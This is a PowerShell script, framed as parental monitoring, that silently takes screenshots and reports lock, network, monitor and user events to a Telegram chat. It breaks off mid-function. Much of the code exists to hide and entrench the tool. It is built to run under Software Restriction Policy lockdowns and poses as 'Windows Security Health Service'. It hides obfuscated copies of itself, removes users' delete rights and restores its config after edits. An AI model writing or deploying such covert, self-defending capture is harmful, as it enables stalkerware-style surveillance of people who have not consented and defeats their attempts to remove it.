<#
Screen to Telegram (PowerShell edition - no Python needed).

Captures this screen at random intervals and sends each shot to a Telegram chat
(for example a parent who follows along). It keeps working with no internet:
shots queue locally and are sent oldest-first once the connection is back.

Pure PowerShell on purpose: powershell.exe lives in an allowed Windows path and
.ps1 is not a restricted type, so it runs even under a Software Restriction
Policy lockdown, and needs nothing installed on the target PC.

The installed copy updates itself from a signed package in the public updates
repo, exactly like the family blocker: only a newer, correctly signed script is
applied, then it restarts.
#>
param(
    [string]$ConfigPath,
    [switch]$Once,
    [switch]$Sample,
    [switch]$ShowVersion
)

# publish.ps1 bumps this (yyyyMMddHHmm) on every release so installed copies see a newer version.
$ScriptVersion = 202610181133

# Updates are accepted only when signed by the matching private key (kept off every repo).
$UpdatePublicKey = '<RSAKeyValue><Modulus>x2SDyPfYHbTKx2/FdLumW5RjRzspTXoOSZ9N7FPw1I+9i/+560IqhWXrLLAV9BiW6j4StEWQGRlLnTsHtEw5+GCQYH2cm0xxDqmOSYUAjLBtLC5MF2CGopk1G3h7trXYDMAyiSLrTafo6sgNnkheQ7E33WTgXXq62+stbHa2VxJiUC4/rnzxKtA/yvXiZiEj17msxYLqwKeJOBgaTckOVEHAXEXEnFcI6+f4DjUfGG6zIVIZ2mhF3HBbrzqvy0Tfa+AL2m8HQDB3eP77GxGoXiaBZO9h2PvCbVEVo4012PtxV1910jlkrBb6QqC58wsXCtjcAEZklP88kgwyznqrgQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>'

if ($ShowVersion) { Write-Output $ScriptVersion; exit 0 }

$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Net.Http
Add-Type -AssemblyName System.Security

$ScriptPath = $MyInvocation.MyCommand.Path
$AppDir     = Split-Path -Parent $ScriptPath
if (-not $ConfigPath) { $ConfigPath = Join-Path $AppDir 'config.json' }

# The program runs hidden, so console text is invisible. Keep a rolling log file
# next to the script: when it passes the cap it rotates to .1 and starts fresh.
$LogFile     = Join-Path $AppDir 'screen_to_telegram.log'
$MaxLogBytes = 1MB

# A loud, unmistakable prefix for problem alerts sent to Telegram: a red circle,
# a siren, and the word WARNING. Built from code points so the source file stays
# plain ASCII (no emoji bytes, no encoding surprises through sign/update).
$AlertPrefix = [char]::ConvertFromUtf32(0x1F534) + [char]::ConvertFromUtf32(0x1F6A8) + ' WARNING'
# ---------- state tracking for event alerts ----------
$InfoPrefix  = [char]::ConvertFromUtf32(0x1F4E2)
$LockEmoji   = [char]::ConvertFromUtf32(0x1F512)
$UnlockEmoji = [char]::ConvertFromUtf32(0x1F513)
$NetEmoji    = [char]::ConvertFromUtf32(0x1F4F5)
$NetOkEmoji  = [char]::ConvertFromUtf32(0x1F4F6)
$MonEmoji    = [char]::ConvertFromUtf32(0x1F4BB)
$UserEmoji   = [char]::ConvertFromUtf32(0x1F464)

$script:WasLocked  = $false
$script:WasOffline = $false
$script:WasMonOff  = $false
$script:LastUser   = $env:USERNAME

$script:ScreenshotHashes  = @{}
$script:WatcherAlertTime  = [datetime]::MinValue
$script:WatcherConfig     = $null
$script:WatcherDevice     = ""
$script:WatcherEmoji      = ""

$script:StartupLnk       = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\ScreenToTelegram.lnk"
$script:StartupLnkHash   = $null
$script:ConfigHash       = $null   # SHA256 of shortcut at startup
$script:TelegramBlocked  = $false  # true when net is up but Telegram API unreachable
$script:BackupDone       = $false  # one-time encrypted backup flag

function Write-Log([string]$Message) {
    $line = "[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message
    Write-Host $line
    try {
        if ((Test-Path $LogFile) -and ((Get-Item $LogFile).Length -gt $MaxLogBytes)) {
            Remove-Item -Force "$LogFile.1" -ErrorAction SilentlyContinue
            Move-Item -Force $LogFile "$LogFile.1"
        }
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {}
}

# ---------- event detection helpers ----------

function Test-ScreenLocked {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class DesktopHelper2 {
    [DllImport("user32.dll")] public static extern IntPtr OpenInputDesktop(uint f, bool inh, uint acc);
    [DllImport("user32.dll")] public static extern bool CloseDesktop(IntPtr h);
    [DllImport("user32.dll",CharSet=CharSet.Unicode)]
    public static extern bool GetUserObjectInformation(IntPtr h,int n,StringBuilder b,uint l,out uint r);
}
"@ -ErrorAction SilentlyContinue
    try {
        $h = [DesktopHelper2]::OpenInputDesktop(0,$false,0x0200)
        if ($h -eq [IntPtr]::Zero) { return $true }
        $sb = New-Object System.Text.StringBuilder 256
        $r  = 0u
        [void][DesktopHelper2]::GetUserObjectInformation($h,2,$sb,256,[ref]$r)
        [void][DesktopHelper2]::CloseDesktop($h)
        return ($sb.ToString() -ieq 'Winlogon')
    } catch { return $false }
}

function Test-MonitorOff {
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class MonitorHelper2 {
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc,int n);
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr h);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr h,IntPtr hdc);
}
"@ -ErrorAction SilentlyContinue
        $hdc = [MonitorHelper2]::GetDC([IntPtr]::Zero)
        $vr  = [MonitorHelper2]::GetDeviceCaps($hdc, 116)
        [void][MonitorHelper2]::ReleaseDC([IntPtr]::Zero, $hdc)
        return ($vr -le 1)
    } catch { return $false }
}

function Test-NetworkUp {
    try {
        $r = (New-Object Net.NetworkInformation.Ping).Send('8.8.8.8', 2000)
        return ($r.Status -eq [Net.NetworkInformation.IPStatus]::Success)
    } catch { return $false }
}

function Get-ActiveUser {
    try {
        $lines = & query.exe session 2>$null
        foreach ($line in $lines) {
            if ($line -match '^\s*>') {
                $parts = $line -split '\s+' | Where-Object { $_ -ne '' }
                if ($parts.Count -gt 1) { return $parts[1] }
            }
        }
    } catch {}
    return $env:USERNAME
}

function Invoke-EventChecks($config) {
    $device = "$($config.device_name)".Trim()
    if (-not $device) { $device = $env:COMPUTERNAME }

    # --- Screen lock / unlock ---
    $locked = Test-ScreenLocked
    if ($locked -and -not $script:WasLocked) {
        $script:WasLocked = $true
        $msg = "$script:LockEmoji $device`: Screen locked at $(Get-Date -Format 'HH:mm:ss')."
        Write-Log $msg
        try { Send-Text $config $msg } catch {}
    } elseif (-not $locked -and $script:WasLocked) {
        $script:WasLocked = $false
        $msg = "$script:UnlockEmoji $device`: Screen unlocked at $(Get-Date -Format 'HH:mm:ss')."
        Write-Log $msg
        try { Send-Text $config $msg } catch {}
    }

    # --- Network on / off ---
    $online = Test-NetworkUp
    if (-not $online -and -not $script:WasOffline) {
        $script:WasOffline = $true
        $msg = "$script:NetEmoji $device`: Internet disconnected at $(Get-Date -Format 'HH:mm:ss'). Screenshots will queue locally."
        Write-Log $msg
        $alertFile = Join-Path (Get-OutboxDir $config) ("alert-offline-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".txt")
        try { [IO.File]::WriteAllText($alertFile, $msg) } catch {}
    } elseif ($online -and $script:WasOffline) {
        $script:WasOffline = $false
        $msg = "$script:NetOkEmoji $device`: Internet reconnected at $(Get-Date -Format 'HH:mm:ss')."
        Write-Log $msg
        try {
            $outbox = Get-OutboxDir $config
            Get-ChildItem -Path $outbox -Filter 'alert-offline-*.txt' | ForEach-Object {
                $txt = [IO.File]::ReadAllText($_.FullName)
                Send-Text $config $txt
                Remove-Item -Force $_.FullName -ErrorAction SilentlyContinue
            }
        } catch {}
        try { Send-Text $config $msg } catch {}
    }

    # --- Monitor on / off ---
    $monOff = Test-MonitorOff
    if ($monOff -and -not $script:WasMonOff) {
        $script:WasMonOff = $true
        $msg = "$script:MonEmoji $device`: Monitor turned OFF at $(Get-Date -Format 'HH:mm:ss')."
        Write-Log $msg
        try { Send-Text $config $msg } catch {}
    } elseif (-not $monOff -and $script:WasMonOff) {
        $script:WasMonOff = $false
        $msg = "$script:MonEmoji $device`: Monitor turned ON at $(Get-Date -Format 'HH:mm:ss')."
        Write-Log $msg
        try { Send-Text $config $msg } catch {}
    }

    # --- User switch ---
    $curUser = Get-ActiveUser
    if ($curUser -and $curUser -ne $script:LastUser) {
        $msg = "$script:UserEmoji $device`: Active user switched from '$script:LastUser' to '$curUser' at $(Get-Date -Format 'HH:mm:ss')."
        Write-Log $msg
        try { Send-Text $config $msg } catch {}
        $script:LastUser = $curUser
    }

    # --- Telegram reachable (blocked by firewall, different from no internet) ---
    if (-not $script:WasOffline) {   # only when net is up
        $tgOk = Test-TelegramReachable $config
        if (-not $tgOk -and -not $script:TelegramBlocked) {
            $script:TelegramBlocked = $true
            $msg = $AlertPrefix + " " + $device + ": Telegram API is UNREACHABLE (internet is up, but Telegram may be blocked by a firewall or VPN). Screenshots will queue."
            Write-Log $msg
            try { Send-Text $config $msg } catch {}
        } elseif ($tgOk -and $script:TelegramBlocked) {
            $script:TelegramBlocked = $false
            $msg = ($script:NetOkEmoji + " " + $device + ": Telegram API is reachable again.")
            Write-Log $msg
            try { Send-Text $config $msg } catch {}
        }
    }

    # --- Startup shortcut integrity ---
    Watch-StartupShortcut $config
    Watch-ConfigFile $config
}
# ---------- security: integrity and tampering detection ----------

function Get-FileHash256([string]$fp) {
    try {
        $sha   = [Security.Cryptography.SHA256]::Create()
        $bytes = [IO.File]::ReadAllBytes($fp)
        $hash  = [BitConverter]::ToString($sha.ComputeHash($bytes)) -replace '-',''
        $sha.Dispose()
        return $hash
    } catch { return $null }
}

function Set-OutboxAcl([string]$folder) {
    try {
        & icacls.exe $folder /inheritance:d /Q 2>$null | Out-Null
        & icacls.exe $folder /grant:r "SYSTEM:(OI)(CI)F" /Q 2>$null | Out-Null
        & icacls.exe $folder /grant:r "Administrators:(OI)(CI)F" /Q 2>$null | Out-Null
        $user = $env:USERNAME
        & icacls.exe $folder /grant:r "${user}:(OI)(CI)(RX,W)" /Q 2>$null | Out-Null
        Write-Log "Outbox ACL hardened: delete rights removed for standard users."
    } catch {
        Write-Log "ACL hardening skipped: $($_.Exception.Message)"
    }
}

function Start-OutboxWatcher($config2, [string]$folder) {
    try {
        $watcher = New-Object IO.FileSystemWatcher $folder, "screenshot-*.jpg"
        $watcher.IncludeSubdirectories = $false
        $watcher.NotifyFilter = [IO.NotifyFilters]"FileName,LastWrite,Size"
        $watcher.EnableRaisingEvents = $true
        $script:WatcherConfig = $config2
        $script:WatcherDevice = "$($config2.device_name)".Trim()
        if (-not $script:WatcherDevice) { $script:WatcherDevice = $env:COMPUTERNAME }
        $script:WatcherEmoji = [char]::ConvertFromUtf32(0x1F6A8)
        $action = {
            $evt  = $Event.SourceEventArgs
            $kind = $evt.ChangeType
            $file = $evt.Name
            if ($file -match "^screenshot-") {
                $now = Get-Date
                if (($now - $script:WatcherAlertTime).TotalSeconds -gt 30) {
                    $script:WatcherAlertTime = $now
                    $msg = $script:WatcherEmoji + " TAMPER ALERT - " + $script:WatcherDevice + ": screenshot [" + $file + "] was " + $kind + " at " + $now.ToString("HH:mm:ss") + ". Someone may have accessed the screenshot folder!"
                    Write-Log $msg
                    try { Send-Text $script:WatcherConfig $msg } catch {}
                }
            }
        }
        Register-ObjectEvent -InputObject $watcher -EventName Deleted -Action $action -SourceIdentifier "STT_Deleted" -ErrorAction SilentlyContinue | Out-Null
        Register-ObjectEvent -InputObject $watcher -EventName Changed -Action $action -SourceIdentifier "STT_Changed" -ErrorAction SilentlyContinue | Out-Null
        Register-ObjectEvent -InputObject $watcher -EventName Renamed -Action $action -SourceIdentifier "STT_Renamed" -ErrorAction SilentlyContinue | Out-Null
        Write-Log "FileSystemWatcher active on: $folder"
        return $watcher
    } catch {
        Write-Log "Could not start FileSystemWatcher: $($_.Exception.Message)"
        return $null
    }
}

function Test-ScreenshotIntegrity([string]$fp) {
    $name = Split-Path -Leaf $fp
    if (-not $script:ScreenshotHashes.ContainsKey($name)) { return $true }
    $cur = Get-FileHash256 $fp
    $orig2 = $script:ScreenshotHashes[$name]
    if ($cur -and ($cur -ne $orig2)) { return $false }
    return $true
}

function Test-TelegramReachable($config) {
    # Separate from Test-NetworkUp: internet may be up but Telegram blocked by firewall.
    try {
        $token = "$($config.telegram.bot_token)".Trim()
        $r = (New-Object Net.WebClient).DownloadString("https://api.telegram.org/bot$token/getMe")
        return ($r -match '"ok":true')
    } catch { return $false }
}

function Watch-StartupShortcut($config) {
    $lnk = $script:StartupLnk
    $device = "$($config.device_name)".Trim(); if (-not $device) { $device = $env:COMPUTERNAME }
    if (-not (Test-Path $lnk)) {
        $msg = $AlertPrefix + " " + $device + ": Startup shortcut was DELETED! The monitor will NOT restart after reboot."
        Write-Log $msg
        try { Send-Text $config $msg } catch {}
        return
    }
    $h = Get-FileHash256 $lnk
    if ($script:StartupLnkHash -and $h -and ($h -ne $script:StartupLnkHash)) {
        $msg = $AlertPrefix + " " + $device + ": Startup shortcut was MODIFIED. Someone may have tampered with the auto-start entry."
        Write-Log $msg
        try { Send-Text $config $msg } catch {}
    }
    $script:StartupLnkHash = $h
}

function Invoke-BackupConfig($config) {
    if ($script:BackupDone) { return }
    try {
        $backupDir = Join-Path $env:APPDATA "Microsoft\.stt-bk"
        if (-not (Test-Path $backupDir)) { New-Item -ItemType Directory -Force -Path $backupDir | Out-Null }
        # Copy script and config with obfuscated names
        $stamp = Get-Date -Format "yyyyMMddHHmm"
        $bkScript = Join-Path $backupDir "win-svc-$stamp.dat"
        $bkConfig = Join-Path $backupDir "svc-cfg-$stamp.dat"
        Copy-Item -Force $ScriptPath $bkScript -ErrorAction Stop
        Copy-Item -Force $ConfigPath $bkConfig -ErrorAction Stop
        # Hide the backup folder
        (Get-Item $backupDir).Attributes = "Hidden"
        $script:BackupDone = $true
        Write-Log "Backup created in hidden folder."
    } catch { Write-Log "Backup failed: $($_.Exception.Message)" }
}

function Get-ProcessDisplayName {
    # Rename the PowerShell window title so it looks like a system process.
    try {
        $host.UI.RawUI.WindowTitle = "Windows Security Health Service"
    } catch {}
    # Also try to set the process description via WMI (best effort)
    try {
        $proc = Get-Process -Id $PID -ErrorAction SilentlyContinue
        if ($proc) { $proc.PriorityClass = "BelowNormal" }
    } catch {}
}

function Unprotect-ConfigData([string]$raw) {
    if (-not $raw) { return $raw }
    $raw = $raw.Trim()
    if ($raw.StartsWith("ENC_DPAPI_CU:")) {
        $b64 = $raw.Substring(13)
        $bytes = [Convert]::FromBase64String($b64)
        $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [System.Text.Encoding]::UTF8.GetString($dec)
    }
    if ($raw.StartsWith("ENC_DPAPI_LM:")) {
        $b64 = $raw.Substring(13)
        $bytes = [Convert]::FromBase64String($b64)
        $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
        return [System.Text.Encoding]::UTF8.GetString($dec)
    }
    return $raw
}

function Protect-ConfigData([string]$plain, [string]$scope = "CurrentUser") {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plain)
    $dpScope = if ($scope -eq "LocalMachine") {
        [System.Security.Cryptography.DataProtectionScope]::LocalMachine
    } else {
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    }
    $enc = [System.Security.Cryptography.ProtectedData]::Protect($bytes, $null, $dpScope)
    $prefix = if ($scope -eq "LocalMachine") { "ENC_DPAPI_LM:" } else { "ENC_DPAPI_CU:" }
    return ($prefix + [Convert]::ToBase64String($enc))
}

function Watch-ConfigFile($config) {
    if (-not $script:ConfigHash -or -not (Test-Path $ConfigPath)) { return }
    $currHash = Get-FileHash256 $ConfigPath
    if ($currHash -and ($currHash -ne $script:ConfigHash)) {
        $device = "$($config.device_name)".Trim()
        if (-not $device) { $device = $env:COMPUTERNAME }
        Write-Log "[WARN] Config file modification detected! Verifying..."

        $tampered = $false
        try {
            $rawCfg = [IO.File]::ReadAllText($ConfigPath, [Text.Encoding]::UTF8)
            $plainCfg = Unprotect-ConfigData $rawCfg
            $testCfg = $plainCfg | ConvertFrom-Json
            if (-not $testCfg.telegram.bot_token) { $tampered = $true }
        } catch {
            $tampered = $true
        }

        if ($tampered) {
            Write-Log "[ALERT] Tampered config could not be validated! Restoring from secure backup..."
            $bkFile = Join-Path $env:APPDATA "Microsoft\.stt-bk\config.bk"
            if (Test-Path $bkFile) {
                Copy-Item -Force $bkFile $ConfigPath
                $script:ConfigHash = (Get-FileHash256 $ConfigPath)
                $alertMsg = $AlertPrefix + " " + $device + ": Unauthorized attempt to modify or corrupt config.json! Restored from secure backup."
                Write-Log $alertMsg
                try { Send-Text $config $alertMsg } catch {}
            }
        } else {
            $script:ConfigHash = $currHash
            Write-Log "[INFO] Config file change verified."
        }
    }
}

# ---------- config ----------

function Get-Config {
    $bkDir  = Join-Path $env:APPDATA "Microsoft\.stt-bk"
    $bkFile = Join-Path $bkDir "config.bk"

    if (-not (Test-Path $ConfigPath)) {
        if (Test-Path $bkFile) {
            Write-Log "[WARN] Config file not found ($ConfigPath). Restoring from secure backup..."
            Copy-Item -Force $bkFile $ConfigPath
        } else {
            throw "Config file not found: $ConfigPath. Run Install.cmd first."
        }
    }

    $raw = [IO.File]::ReadAllText($ConfigPath, [Text.Encoding]::UTF8)
    $plain = $null
    $needRecover = $false
    try {
        $plain = Unprotect-ConfigData $raw
        $config = $plain | ConvertFrom-Json
        if (-not $config.telegram.bot_token) { $needRecover = $true }
    } catch {
        $needRecover = $true
    }

    if ($needRecover) {
        Write-Log "[ERROR] Config corrupted or unreadable. Attempting backup recovery..."
        if (Test-Path $bkFile) {
            $rawBk = [IO.File]::ReadAllText($bkFile, [Text.Encoding]::UTF8)
            $plain = Unprotect-ConfigData $rawBk
            $config = $plain | ConvertFrom-Json
            [IO.File]::WriteAllText($ConfigPath, $rawBk, [Text.Encoding]::UTF8)
            Write-Log "[INFO] Config restored from backup successfully."
        } else {
            throw "Config file is invalid and no backup exists."
        }
    }

    # If it was plaintext JSON, automatically encrypt it with DPAPI
    if (-not $raw.StartsWith("ENC_DPAPI_")) {
        try {
            $enc = Protect-ConfigData $plain "CurrentUser"
            [IO.File]::WriteAllText($ConfigPath, $enc, [Text.Encoding]::UTF8)
            Write-Log "[INFO] Config file was automatically encrypted with DPAPI."
        } catch {}
    }

    # Ensure secure backup exists
    try {
        if (-not (Test-Path $bkDir)) { New-Item -ItemType Directory -Force -Path $bkDir | Out-Null }
        $currRaw = [IO.File]::ReadAllText($ConfigPath, [Text.Encoding]::UTF8)
        [IO.File]::WriteAllText($bkFile, $currRaw, [Text.Encoding]::UTF8)
    } catch {}

    $script:ConfigHash = Get-FileHash256 $ConfigPath

    $token = "$($config.telegram.bot_token)".Trim()
    $chat  = "$($config.telegram.chat_id)".Trim()
    if (-not $token -or $token.StartsWith('PASTE_')) { throw "Missing telegram.bot_token in $ConfigPath." }
    if (-not $chat  -or $chat.StartsWith('PASTE_'))  { throw "Missing telegram.chat_id in $ConfigPath." }

    $min = [double]$config.interval.min_seconds
    $max = [double]$config.interval.max_seconds
    if ($min -le 0 -or $max -le 0) { throw "interval.min_seconds and interval.max_seconds must be greater than 0." }
    if ($min -gt $max) { throw "interval.min_seconds must not be greater than interval.max_seconds." }

    $q = [int]$config.screenshots.quality_height
    if ($q -ne 360 -and $q -ne 480) { throw "screenshots.quality_height must be 360 or 480 (got $q)." }

    return $config
}

function Get-OutboxDir($config) {
    $folder = "$($config.screenshots.folder)"
    if (-not $folder) { $folder = 'screenshots' }
    if (-not [IO.Path]::IsPathRooted($folder)) { $folder = Join-Path $AppDir $folder }
    if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Force -Path $folder | Out-Null }
    return $folder
}

# ---------- capture ----------

function Get-ScreenBitmap {
    $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $full = New-Object System.Drawing.Bitmap $vs.Width, $vs.Height
    $g = [System.Drawing.Graphics]::FromImage($full)
    $g.CopyFromScreen($vs.Location, [System.Drawing.Point]::Empty, $vs.Size)
    $g.Dispose()
    return $full
}

function Resize-Bitmap($src, [int]$targetH) {
    $ratio = $targetH / $src.Height
    $newW  = [int]([Math]::Max(1, [Math]::Round($src.Width * $ratio)))
    $dst = New-Object System.Drawing.Bitmap $newW, $targetH
    $g = [System.Drawing.Graphics]::FromImage($dst)
    $g.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
    $g.DrawImage($src, 0, 0, $newW, $targetH)
    $g.Dispose()
    return $dst
}

# Blur by shrinking to 1/factor then stretching back: small text and numbers
# become unreadable while the overall layout stays recognizable. Returns a NEW
# bitmap; the caller disposes $src.
function Blur-Bitmap($src, [int]$factor) {
    $bw = [int][Math]::Max(1, [Math]::Floor($src.Width / $factor))
    $bh = [int][Math]::Max(1, [Math]::Floor($src.Height / $factor))
    $tiny = New-Object System.Drawing.Bitmap $bw, $bh
    $g = [System.Drawing.Graphics]::FromImage($tiny)
    $g.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBilinear
    $g.DrawImage($src, 0, 0, $bw, $bh)
    $g.Dispose()

    $out = New-Object System.Drawing.Bitmap $src.Width, $src.Height
    $g2 = [System.Drawing.Graphics]::FromImage($out)
    $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBilinear
    $g2.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::Half
    $g2.DrawImage($tiny, 0, 0, $src.Width, $src.Height)
    $g2.Dispose()
    $tiny.Dispose()
    return $out
}

function Save-Jpeg($bmp, [string]$path, [int]$quality) {
    if ($quality -le 0) { $quality = 60 }
    $jpeg = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
    $params = New-Object System.Drawing.Imaging.EncoderParameters 1
    $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]$quality)
    $bmp.Save($path, $jpeg, $params)
}

function Save-Screenshot($config, [string]$folder) {
    $targetH = [int]$config.screenshots.quality_height
    $quality = [int]$config.screenshots.jpeg_quality
    $blur    = [int]$config.screenshots.blur_strength

    $full = Get-ScreenBitmap
    $img = Resize-Bitmap $full $targetH
    $full.Dispose()

    # blur_strength 0 or 1 = no blur; 2+ makes text progressively unreadable.
    if ($blur -ge 2) {
        $blurred = Blur-Bitmap $img $blur
        $img.Dispose()
        $img = $blurred
    }

    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $name  = "screenshot-$stamp-$([guid]::NewGuid().ToString('N').Substring(0,6)).jpg"
    $path  = Join-Path $folder $name
    Save-Jpeg $img $path $quality
    $img.Dispose()

    $captureHash = Get-FileHash256 $path
    if ($captureHash) {
        $script:ScreenshotHashes[(Split-Path -Leaf $path)] = $captureHash
        if ($script:ScreenshotHashes.Count -gt 500) {
            $oldK = @($script:ScreenshotHashes.Keys | Sort-Object)[0]
            $script:ScreenshotHashes.Remove($oldK)
        }
    }

    return $path
}

# Writes local preview images at several blur strengths. Nothing is sent.
function Invoke-Sample {
    try { $config = Get-Config } catch {
        $config = [pscustomobject]@{ screenshots = [pscustomobject]@{ quality_height = 360; jpeg_quality = 60 } }
    }
    $targetH = [int]$config.screenshots.quality_height
    if ($targetH -ne 360 -and $targetH -ne 480) { $targetH = 360 }
    $quality = [int]$config.screenshots.jpeg_quality
    $folder = Join-Path $AppDir 'samples'
    if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Force -Path $folder | Out-Null }

    $full = Get-ScreenBitmap
    $base = Resize-Bitmap $full $targetH
    $full.Dispose()

    foreach ($f in 0, 3, 5, 7, 9, 12) {
        if ($f -lt 2) { $img = Resize-Bitmap $base $targetH } else { $img = Blur-Bitmap $base $f }
        $path = Join-Path $folder ("sample-blur-{0:D2}.jpg" -f $f)
        Save-Jpeg $img $path $quality
        $img.Dispose()
        $kb = [int]((Get-Item $path).Length / 1KB)
        Write-Log "Sample blur_strength=$f -> $(Split-Path -Leaf $path) ($kb KB)"
    }
    $base.Dispose()
    Write-Host ""
    Write-Host "Preview images are in: $folder" -ForegroundColor Green
    Write-Host "Open them, pick the one where text is unreadable, and set that number as screenshots.blur_strength."
}

function Limit-Queue($config, [string]$folder) {
    $maxMb = [double]$config.screenshots.max_pending_mb
    if (-not $maxMb -or $maxMb -le 0) { return }
    $cap = $maxMb * 1MB
    $pending = @(Get-ChildItem -Path $folder -Filter 'screenshot-*.jpg' -File | Sort-Object Name)
    $total = ($pending | Measure-Object -Property Length -Sum).Sum
    $dropped = 0
    while ($pending.Count -gt 0 -and $total -gt $cap) {
        $oldest = $pending[0]
        $total -= $oldest.Length
        Remove-Item -Force $oldest.FullName -ErrorAction SilentlyContinue
        $pending = $pending[1..($pending.Count - 1)]
        $dropped++
    }
    if ($dropped) { Write-Log "Offline queue over $maxMb MB: dropped $dropped oldest screenshot(s)." }
}

# ---------- Telegram ----------

$script:HttpClient = $null
function Get-HttpClient {
    if (-not $script:HttpClient) {
        $script:HttpClient = New-Object System.Net.Http.HttpClient
        $script:HttpClient.Timeout = [TimeSpan]::FromSeconds(60)
    }
    return $script:HttpClient
}

function Get-Caption($config, [string]$fileName) {
    $device = "$($config.device_name)".Trim()
    if (-not $device) { $device = $env:COMPUTERNAME }
    if ($fileName -match 'screenshot-(\d{8})-(\d{6})-') {
        $captured = [datetime]::ParseExact($Matches[1] + $Matches[2], 'yyyyMMddHHmmss', $null)
        $stamp = $captured.ToString('yyyy-MM-dd HH:mm:ss')
        $delayed = ''
        if (((Get-Date) - $captured).TotalSeconds -gt 90) { $delayed = ' (delayed)' }
        return "$device - $stamp$delayed"
    }
    return "$device - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
}

# On failure this sets $script:LastSendErrorKind, then throws. The caller reads
# the kind to decide what to do:
#   'network' - the connection is down; keep every queued shot and retry later.
#   'auth'    - the bot/chat is refused (bad token, wrong chat id, bot blocked);
#               retrying this cycle is pointless, so hold and surface it.
#   'file'    - Telegram refused THIS photo (bad size/dimensions/content); the
#               rest of the queue is fine, so quarantine this one and move on.
$script:LastSendErrorKind = $null
function Send-Photo($config, [string]$path, [string]$caption) {
    $token = "$($config.telegram.bot_token)".Trim()
    $chat  = "$($config.telegram.chat_id)".Trim()

    $bytes = [IO.File]::ReadAllBytes($path)
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $content.Add((New-Object System.Net.Http.StringContent $chat), 'chat_id')
    $content.Add((New-Object System.Net.Http.StringContent $caption), 'caption')
    $file = New-Object System.Net.Http.ByteArrayContent (,$bytes)
    $file.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/jpeg')
    $content.Add($file, 'photo', [IO.Path]::GetFileName($path))

    try {
        $resp = (Get-HttpClient).PostAsync("https://api.telegram.org/bot$token/sendPhoto", $content).GetAwaiter().GetResult()
    } catch {
        $script:LastSendErrorKind = 'network'
        throw "Could not reach Telegram: $($_.Exception.InnerException.Message) (connection is down)."
    }
    $body = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
    if (-not $resp.IsSuccessStatusCode) {
        $desc = $body
        try { $desc = ($body | ConvertFrom-Json).description } catch {}
        $code = [int]$resp.StatusCode
        if ($code -eq 401 -or $code -eq 403 -or $desc -match 'chat not found|bot was blocked|unauthorized|chat_id') {
            $script:LastSendErrorKind = 'auth'
        } else {
            # 400/413/etc: this specific image was refused, not the account.
            $script:LastSendErrorKind = 'file'
        }
        throw "Telegram rejected the screenshot (HTTP $code): $desc."
    }
}

function Send-Text($config, [string]$text) {
    $token = "$($config.telegram.bot_token)".Trim()
    $chat  = "$($config.telegram.chat_id)".Trim()
    if (-not $token -or -not $chat) { return }
    try {
        $u = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat&text=$([uri]::EscapeDataString($text))"
        (Get-HttpClient).GetAsync($u).GetAwaiter().GetResult() | Out-Null
    } catch {}
}

function Flush-Outbox($config) {
    $folder = Get-OutboxDir $config
    $keep = [bool]$config.screenshots.keep_after_send
    $pending = @(Get-ChildItem -Path $folder -Filter 'screenshot-*.jpg' -File | Sort-Object Name)
    if ($pending.Count -eq 0) { return 0 }

    $sent = 0
    foreach ($item in $pending) {
        $script:LastSendErrorKind = $null
        if (-not (Test-ScreenshotIntegrity $item.FullName)) {
            $dev2 = "$($config.device_name)".Trim()
            if (-not $dev2) { $dev2 = $env:COMPUTERNAME }
            $intMsg = $AlertPrefix + " " + $dev2 + ": Screenshot [" + $item.Name + "] FAILED integrity check. File was modified after capture and will NOT be sent."
            Write-Log $intMsg
            try { Send-Text $config $intMsg } catch {}
            $rejDir = Join-Path $folder "rejected"
            if (-not (Test-Path $rejDir)) { New-Item -ItemType Directory -Force -Path $rejDir | Out-Null }
            Move-Item -Force $item.FullName (Join-Path $rejDir $item.Name) -ErrorAction SilentlyContinue
            continue
        }
        try {
            Send-Photo $config $item.FullName (Get-Caption $config $item.Name)
        } catch {
            # A single bad image must never block the rest of the queue: quarantine
            # it and keep draining. Network/auth failures hold the whole queue.
            if ($script:LastSendErrorKind -eq 'file') {
                $rejected = Join-Path $folder 'rejected'
                if (-not (Test-Path $rejected)) { New-Item -ItemType Directory -Force -Path $rejected | Out-Null }
                Move-Item -Force $item.FullName (Join-Path $rejected $item.Name) -ErrorAction SilentlyContinue
                Write-Log "Telegram refused $($item.Name); moved it to 'rejected' and kept going. Reason: $($_.Exception.Message)"
                # Keep the quarantine folder from growing without bound.
